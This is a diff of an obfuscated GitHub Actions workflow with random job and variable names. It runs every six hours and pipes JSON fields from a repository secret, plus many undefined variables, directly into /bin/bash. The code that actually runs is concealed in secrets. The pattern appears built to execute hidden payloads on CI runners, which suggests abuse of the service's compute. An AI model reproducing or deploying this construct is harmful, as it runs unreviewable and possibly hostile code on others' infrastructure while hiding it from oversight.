@@ -1,10 +1,9 @@
 name: meiwucan8563
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 0/6 * * *'
-jobs:  # 5874
+    - cron: '55 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,27 +11,22 @@ jobs:  # 5874
       - uses: actions/checkout@v4
       - name: meiwucan8563
         env:
-          nar262: ${{ secrets.nar262 }}
+          vcr3: ${{ secrets.vcr3 }}
         run: |
-          echo $nar262 | jq -r .p887 | /bin/bash
-          echo $jcc0388 | jq -r .ghfc73931 | /bin/bash
-          echo $qd39359 | jq -r .upxi10710 | /bin/bash
-          echo $kua0080 | jq -r .cbc52063 | /bin/bash
-          echo $km02 | jq -r .qn97 | /bin/bash
-          echo $wvur9 | jq -r .o653 | /bin/bash
-          echo $a5336 | jq -r .irju51350 | /bin/bash
-          echo $czkyc096 | jq -r .iy33 | /bin/bash
-          echo $smzj9 | jq -r .xszp7 | /bin/bash
-          echo $x3457 | jq -r .wrv1 | /bin/bash
-          echo $gjt352 | jq -r .deio10 | /bin/bash
-          echo $rftwv87622 | jq -r .mb66 | /bin/bash
-          echo $zpt290 | jq -r .drlq18913 | /bin/bash
-          echo $kfq7617 | jq -r .en12014 | /bin/bash
-          echo $vzh05844 | jq -r .spq455 | /bin/bash
-          echo $rmem5518 | jq -r .p79 | /bin/bash
-          echo $sumps74 | jq -r .w2604 | /bin/bash
-          echo $ysyld45 | jq -r .zwt7760 | /bin/bash
-          echo $wzjg243 | jq -r .vbgq99 | /bin/bash
-          echo $b69 | jq -r .ta5980 | /bin/bash
-          echo $xalvc34 | jq -r .n9 | /bin/bash
+          echo $vcr3 | jq -r .jvdwm72952 | /bin/bash
+          echo $q6 | jq -r .lv50 | /bin/bash
+          echo $qb19405 | jq -r .icwae106 | /bin/bash
+          echo $hkl0 | jq -r .lns155 | /bin/bash
+          echo $eq486 | jq -r .vu26581 | /bin/bash
+          echo $a1 | jq -r .phdo8 | /bin/bash
+          echo $jevu54 | jq -r .wwb5484 | /bin/bash
+          echo $iaize75 | jq -r .vg907 | /bin/bash
+          echo $c9847 | jq -r .wjfh58206 | /bin/bash
+          echo $rtt6 | jq -r .txm6201 | /bin/bash
+          echo $p42 | jq -r .sx69620 | /bin/bash
+          echo $cbtik700 | jq -r .bie59 | /bin/bash
+          echo $h0 | jq -r .opezn8 | /bin/bash
+          echo $rp44742 | jq -r .zls3 | /bin/bash
+          echo $pbxs80 | jq -r .fnmog24336 | /bin/bash
+          echo $vph4772 | jq -r .kef3 | /bin/bash
 
